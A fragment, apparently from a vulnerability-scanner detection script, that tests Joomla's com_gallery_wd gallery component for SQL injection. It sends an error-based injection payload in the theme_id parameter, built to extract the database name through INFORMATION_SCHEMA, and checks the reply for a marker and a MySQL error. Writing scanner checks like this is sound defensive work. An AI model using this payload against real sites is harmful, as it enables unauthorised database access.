...
url = dir + "/index.php?option=com_gallery_wd&view=gallerybox&image_id=19" + "&gallery_id=2&theme_id=1%20AND%20(SELECT%206173%20FROM(SELECT%" + "20COUNT(*),CONCAT(0x716b627871,SQL-INJECTION-TEST(MID((IFNULL(" + "CAST(database()%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND" + "(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&lang=fr";
if(http_vuln_check( port: http_port, url: url, pattern: "SQL-INJECTION-TEST", extra_check: "You have an error in your SQL syntax" )){
